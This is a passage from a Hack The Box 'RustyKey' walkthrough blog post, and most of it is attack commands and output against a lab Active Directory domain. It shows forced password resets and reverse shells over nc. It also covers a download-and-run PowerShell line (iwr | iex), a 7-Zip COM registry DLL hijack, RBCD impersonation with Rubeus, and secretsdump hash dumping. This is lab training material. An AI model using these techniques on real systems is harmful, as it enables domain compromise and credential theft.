class="string">&quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;</span>, line 210, <span class="keyword">in</span> main</span><br><span class="line">    output = args.func(conn, **params)</span><br><span class="line">  File <span class="string">&quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py&quot;</span>, line 252, <span class="keyword">in</span> groupMember</span><br><span class="line">    conn.ldap.bloodymodify(group, &#123;<span class="string">&quot;member&quot;</span>: [(Change.ADD.value, member_transformed)]&#125;)</span><br><span class="line">    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/root/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py&quot;</span>, line 301, <span class="keyword">in</span> bloodymodify</span><br><span class="line">    raise err</span><br><span class="line">msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=HelpDesk,CN=Users,DC=rustykey,DC=htb! Result code: <span class="string">&quot;entryAlreadyExists&quot;</span> Reason: <span class="string">&quot;b&#x27;00000562: UpdErr: DSID-031A11DA, problem 6005 (ENTRY_EXISTS), data 0\n\x00&#x27;&quot;</span></span><br><span class="line">Removing Support and IT from Protected Objects</span><br><span class="line">[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75</span><br><span class="line">[*] Trying to connect to DC.rustykey.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[-] CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB</span><br><span class="line">[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75</span><br><span class="line">[*] Trying to connect to DC.rustykey.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[-] CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB</span><br><span class="line">Setting Password:P@ssw0rd123! <span class="keyword">for</span> ee.reed,bb.morgan,gg.anderson. Grab a TGT afterwards.</span><br><span class="line">[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75</span><br><span class="line">[*] Trying to connect to DC.rustykey.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75</span><br><span class="line">[*] Trying to connect to DC.rustykey.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75</span><br><span class="line">[*] Trying to connect to DC.rustykey.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>
<p><img src="/img/goldeneye-boris.gif"></p>
<p>Now we can request a TGT and try to get on the box seeing how most of the users are in the <em>Remote Management</em> group. Yet, if we look at the attributes set for <em>gg.anderson</em>, their account is disabled and we have no way of removing that User Account Control.  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uSNCreated: 20637</span><br><span class="line">userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD</span><br><span class="line">userPrincipalName: gg.anderson@rustykey.htb</span><br></pre></td></tr></table></figure>
<p>So for <em>ee.reed</em> and <em>dd.ali</em>, even getting a TGT won’t allow us to log in. The only ticket to work was <em>bb.morgan</em>.</p>
<h2 id="Foothold-with-bb-morgan"><a href="#Foothold-with-bb-morgan" class="headerlink" title="Foothold with bb.morgan"></a>Foothold with bb.morgan</h2><p>Once we have the correct <em>krb5.conf</em> we can get on the box. You can use <em>nxc</em> to generate a krb file as well with this TGT.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">konoha# nxc smb DC.rustykey.htb -d rustykey.htb -k --use-kcache --generate-krb5-file rustykey.conf</span><br><span class="line">SMB         DC.rustykey.htb 445    DC               [*]  x64 (name:DC) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)</span><br><span class="line">SMB         DC.rustykey.htb 445    DC               [+] rustykey.htb\bb.morgan from ccache</span><br><span class="line">konoha# <span class="built_in">cat</span> rustykey.conf</span><br><span class="line"></span><br><span class="line">[libdefaults]</span><br><span class="line">    dns_lookup_kdc = <span class="literal">false</span></span><br><span class="line">    dns_lookup_realm = <span class="literal">false</span></span><br><span class="line">    default_realm = RUSTYKEY.HTB</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    RUSTYKEY.HTB = &#123;</span><br><span class="line">        kdc = dc.rustykey.htb</span><br><span class="line">        admin_server = dc.rustykey.htb</span><br><span class="line">        default_domain = rustykey.htb</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    .rustykey.htb = RUSTYKEY.HTB</span><br><span class="line">    rustykey.htb = RUSTYKEY.HTB</span><br></pre></td></tr></table></figure>
<p>Once do we can WinRM onto the box. </p>
<p>Initially, our enumeration doesn’t find anything other then a <em>7-Zip</em> directory in <em>Program Files</em>, we’ll come back to that and move on to the users we have the ability to change the password of. Looking at all the users we have, <em>ee.reed</em> is in the <em>Support</em> group. We can laterally move to him and see what kind of permissions he has. </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata&gt; .\RCs.exe ee.reed P@ssw0rd123! <span class="string">&quot;C:\ProgramData\a.exe&quot;</span> <span class="literal">-t</span> <span class="number">0</span></span><br><span class="line">[*] Warning: User profile directory <span class="keyword">for</span> user ee.reed does not exists. Use <span class="literal">--force-profile</span> <span class="keyword">if</span> you want to force the creation.</span><br><span class="line">[*] Warning: The logon <span class="keyword">for</span> user <span class="string">&#x27;ee.reed&#x27;</span> is limited. Use the flag combination <span class="literal">--bypass-uac</span> and <span class="literal">--logon-type</span> <span class="string">&#x27;8&#x27;</span> to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session <span class="number">0</span> with <span class="keyword">process</span> <span class="function"><span class="keyword">function</span> <span class="title">CreateProcessWithLogonW</span><span class="params">()</span></span></span><br><span class="line">[+] <span class="keyword">Using</span> Station\Desktop: Service-0x0-6658a90$\Default</span><br><span class="line">[+] Async <span class="keyword">process</span> <span class="string">&#x27;C:\ProgramData\a.exe&#x27;</span> with pid <span class="number">13996</span> created <span class="keyword">in</span> background.</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata&gt;</span><br><span class="line"></span><br><span class="line"><span class="literal">-----</span></span><br><span class="line"></span><br><span class="line">konoha<span class="comment"># rlwrap -cAr nc -lvnp 443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.14.7</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.11.75</span>] <span class="number">52766</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.17763.7434</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">rustykey\ee.reed</span><br></pre></td></tr></table></figure>

<h2 id="Shell-as-ee-reed"><a href="#Shell-as-ee-reed" class="headerlink" title="Shell as ee.reed"></a>Shell as ee.reed</h2><p>Starting with enumeration again,this time using <em>PrivescCheck.ps1</em> we find a <strong>COM Registry</strong>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">iwr</span> http://<span class="number">10.10</span>.<span class="number">14.7</span>:<span class="number">81</span>/PrivescCheck.ps1 <span class="literal">-UseBasicParsing</span> | <span class="built_in">iex</span></span><br><span class="line"><span class="built_in">iwr</span> http://<span class="number">10.10</span>.<span class="number">14.7</span>:<span class="number">81</span>/PrivescCheck.ps1 <span class="literal">-UseBasicParsing</span> | <span class="built_in">iex</span></span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Invoke-PrivescCheck</span></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">? CATEGORY ? TA0004 - Privilege Escalation                     ?</span><br><span class="line">? NAME     ? COM server registry permissions                   ?</span><br><span class="line">? <span class="built_in">TYPE</span>     ? Base                                              ?</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">? Check whether the current user has any modification rights   ?</span><br><span class="line">? on a COM server <span class="keyword">in</span> the registry. This may not necessarily    ?</span><br><span class="line">? result <span class="keyword">in</span> a privilege escalation. Further analysis is        ?</span><br><span class="line">? required.                                                    ?</span><br><span class="line">????????????????????????????????????????????????????????????????</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">Id                : <span class="number">23170</span>f69<span class="literal">-40c1-278a-1000-000100020000</span></span><br><span class="line">Name              : <span class="number">7</span><span class="literal">-Zip</span> Shell Extension</span><br><span class="line">RegPath           : HKLM\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>f69<span class="literal">-40c1-278a-1000-000100020000</span>&#125;</span><br><span class="line">HandlerType       : InprocServer32</span><br><span class="line">FTWARE\Classes\CLSID\&#123;<span class="number">23170</span>f69<span class="literal">-40c1-278a-1000-000100020000</span>&#125;\InprocServer32</span><br><span class="line">HandlerDataType   : FilePath</span><br><span class="line">HandlerData       : C:\Program Files\<span class="number">7</span><span class="literal">-Zip</span>\<span class="number">7</span><span class="literal">-zip</span>.dll</span><br><span class="line">ModifiablePath    : HKLM\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>f69<span class="literal">-40c1-278a-1000-000100020000</span>&#125;\InprocServer32</span><br><span class="line">IdentityReference : RUSTYKEY\Support (S<span class="literal">-1-5-21-3316070415-896458127-4139322052-1132</span>)</span><br><span class="line">Permissions       : AllAccess</span><br></pre></td></tr></table></figure>

<p><img src="/img/great.gif"></p>
<p>Funny enough this was seen when we had a session as <em>bb.morgan</em>. We have AllAccess so we can use some classic DLL hijacking and replace this value within registry. After creating a simple dll using <em>msfvenom</em> we can upload it, setup a listener and edit the value.. </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; reg add <span class="string">&quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32&quot;</span> /ve /t REG_SZ /d <span class="string">&quot;C:\ProgramData\a.dll&quot;</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\InprocServer32&quot;</span> /ve /t REG_SZ /d <span class="string">&quot;C:\ProgramData\a.dll&quot;</span></span><br><span class="line">Value  exists, overwrite(Yes/No)? Yes</span><br><span class="line">The operation completed successfully.</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; reg query <span class="string">&quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\&quot;</span> /ve /s</span><br><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Classes\CLSID\&#123;23170f69-40c1-278a-1000-000100020000&#125;\&quot;</span> /ve /s</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>f69<span class="literal">-40c1-278a-1000-000100020000</span>&#125;</span><br><span class="line">    (Default)    REG_SZ    <span class="number">7</span><span class="literal">-Zip</span> Shell Extension</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#123;<span class="number">23170</span>f69<span class="literal">-40c1-278a-1000-000100020000</span>&#125;\InprocServer32</span><br><span class="line">    (Default)    REG_SZ    C:\ProgramData\a.dll</span><br></pre></td></tr></table></figure>

<p>Waiting a minute or two results in getting a shell as <em>mm.turner</em>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">konoha<span class="comment"># rlwrap -cAr nc -lvnp 443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.14.7</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.11.75</span>] <span class="number">52428</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.17763.7434</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">rustykey\mm.turner</span><br></pre></td></tr></table></figure>

<h2 id="Shell-as-mm-turner"><a href="#Shell-as-mm-turner" class="headerlink" title="Shell as mm.turner"></a>Shell as mm.turner</h2><p>Interesting, we now have a shell as <em>mm.turner</em>, and if we look back at Bloodhound we see he’s apart of <em>DelegationManagers</em>. That being said, we have <em>AddAllowedToAct</em> to the DC$. So essentially here we have <strong>RBCD</strong>(Resource-Based Constrained Delegation). This <a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">article</a> helps explain the theory, yet what we need to do is set the attribute <code>PrincipalsAllowedToDelegateToAccount</code> on the DC$ to allow for the computer account we control (IT-Computer3$), and then impersonate and high level user. Using S4U2Self+S4U2proxy we’re able to get a TGS and then use that to authenticate to the DC$. As <em>mm.turner</em>, we can set the attribute for the DC$, then for the rbcd we will be using <em>Rubeus.exe</em>.</p>
<h3 id="Mom-said-I’m-allowed-too-Privesc"><a href="#Mom-said-I’m-allowed-too-Privesc" class="headerlink" title="Mom said I’m allowed too Privesc!!"></a>Mom said I’m allowed too Privesc!!</h3><p><img src="/img/youcantdothat.gif"></p>
<p>Let’s go ahead a get the TGS as <em>backupadmin</em> and then we can <em>secretsdump</em>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ProgramData&gt; <span class="variable">$targetComputer</span> = <span class="string">&quot;CN=DC,OU=DOMAIN CONTROLLERS,DC=RUSTYKEY,DC=HTB&quot;</span></span><br><span class="line"><span class="variable">$targetComputer</span> = <span class="string">&quot;CN=DC,OU=DOMAIN CONTROLLERS,DC=RUSTYKEY,DC=HTB&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData&gt; <span class="built_in">Set-ADComputer</span> <span class="variable">$targetComputer</span> <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> <span class="string">&quot;CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb&quot;</span></span><br><span class="line"><span class="built_in">Set-ADComputer</span> <span class="variable">$targetComputer</span> <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> <span class="string">&quot;CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData&gt; .\Rub.exe hash /domain:rustykey.htb /user:IT<span class="literal">-Computer3</span><span class="variable">$</span> /password:&lt;SNIP&gt;</span><br><span class="line">.\Rub.exe hash /domain:rustykey.htb /user:IT<span class="literal">-Computer3</span><span class="variable">$</span> /password:&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Calculate Password Hash(es)</span><br><span class="line"></span><br><span class="line">[*] Input password             : &lt;SNIP&gt;</span><br><span class="line">[*] Input username             : IT<span class="literal">-Computer3</span><span class="variable">$</span></span><br><span class="line">[*] Input domain               : rustykey.htb</span><br><span class="line">[*] Salt                       : RUSTYKEY.HTBhostit<span class="literal">-computer3</span>.rustykey.htb</span><br><span class="line">[*]       rc4_hmac             : &lt;SNIP&gt;</span><br><span class="line">[*]       aes128_cts_hmac_sha1 : &lt;SNIP&gt;</span><br><span class="line">[*]       aes256_cts_hmac_sha1 : &lt;SNIP&gt;</span><br><span class="line">[*]       des_cbc_md5          : &lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData&gt;./Rub.exe s4u /nowrap /impersonateuser:backupadmin /domain:rustykey.htb /user:IT<span class="literal">-Computer3</span><span class="variable">$</span> /password:&lt;SNIP&gt; /rc4:&lt;SNIP&gt;  /msdsspn:host/dc.rustykey.htb /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: &lt;SNIP&gt;</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;rustykey.htb\IT-Computer3$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: fe80::bd5e:24aa:d271:1fea%11:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFmDCCBZSgAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoQ4bDFJVU1RZS0VZLkhUQqIhMB</span><br><span class="line">                                        &lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;IT-Computer3$@RUSTYKEY.HTB&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dc.rustykey.htb (fe80::bd5e:24aa:d271:1fea%11)</span><br><span class="line">[*] Sending S4U2self request to fe80::bd5e:<span class="number">24</span>aa:d271:<span class="number">1</span>fea%<span class="number">11</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;backupadmin&#x27;</span> to <span class="string">&#x27;IT-Computer3$@RUSTYKEY.HTB&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFtjCCBbKgAwIBBaEDAgEWooIEzzCCBMthggTHMIIEw6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIaMB</span><br><span class="line">                                        &lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[*] Impersonating user <span class="string">&#x27;backupadmin&#x27;</span> to target SPN <span class="string">&#x27;host/dc.rustykey.htb&#x27;</span></span><br><span class="line">[*] Building S4U2proxy request <span class="keyword">for</span> service: <span class="string">&#x27;host/dc.rustykey.htb&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: dc.rustykey.htb (fe80::bd5e:24aa:d271:1fea%11)</span><br><span class="line">[*] Sending S4U2proxy request to domain controller fe80::bd5e:<span class="number">24</span>aa:d271:<span class="number">1</span>fea%<span class="number">11</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi) <span class="keyword">for</span> SPN <span class="string">&#x27;host/dc.rustykey.htb&#x27;</span>:</span><br><span class="line"></span><br><span class="line">      doIGfjCCBnqgAwIBBaEDAgEWooIFjzCCBYthggWHMIIFg6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIiML</span><br><span class="line">                                        &lt;SNIP&gt;</span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
<p><em><strong>For myself, I like to use <code>/ptt</code> which does pass-the-ticket but allows me to know that <code>Rubeus</code> succeeded. Then I can look at the ticket on the host system to make sure everything is correct.</strong></em></p>
<p>This gets us a TGS for the user <em>backupadmin</em>, from here we can import and <em>secretsdump</em>. (using a script for my b64 TGS)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">konoha# <span class="built_in">source</span> ./converITAll.sh doIGfjCCBnqgAwIBBaEDAgEWooIFjzCCBYthggWHMIIFg6ADAgEFoQ4bDFJ&lt;SNIP&gt;</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] <span class="keyword">done</span></span><br><span class="line">Ticket cache: FILE:./Admin.ccache</span><br><span class="line">Default principal: backupadmin@RUSTYKEY.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">07/01/2025 19:55:02  07/02/2025 05:55:02  host/dc.rustykey.htb@RUSTYKEY.HTB</span><br><span class="line">	renew <span class="keyword">until</span> 07/08/2025 19:55:02</span><br><span class="line">konoha# impacket-secretsdump @dc.rustykey.htb -k -no-pass -dc-ip 10.10.11.75</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kerberoasting-SPNs/">kerberoasting SPNs</a><a class="post-meta__tags" href="/tags/Registry/">Registry</a><a class="post-meta__tags" href="/tags/DACL-Abuse/">DACL Abuse</a><a class="post-meta__tags" href="/tags/COM-HiJack/">COM HiJack</a><a class="post-meta__tags" href="/tags/RBCD/">RBCD</a></div><div class="post-share"><div class="social-share" data-image="/img/rustykey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/27/Era/" title="Era (Linux Hard)"><img class="cover" src="/img/era.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Era (Linux Hard)</div></div><div class="info-2"><div class="info-item-1"> This is a linux hard box focusing on SSRF which you can use in turn to trigger ssh2.exec. This executes on the box giving a reverse shell. On the box we escalate to eric with previously cracked hash. Using pspy, we find a binary running via cronjob. The binary objcopy is used to check a file, with in turn we replace with our malicious binary that upon execution gets us a shell as root.  Initial Nmap12345678PORT   STATE SERVICE REASON         VERSION21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.580/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://era.htb/Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  FTP for smilesLooking at FTP and trying anonymous logon get us nothing. Moving on. HTTPScanning this site gives us the domain name era.htb we can add to our hosts file. Looking at the site nothing special.  We can...</div></div></div></a><a class="pagination-related" href="/2025/06/30/Voleur/" title="Voleur (Windows Medium)"><img class="cover" src="/img/voleur.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div 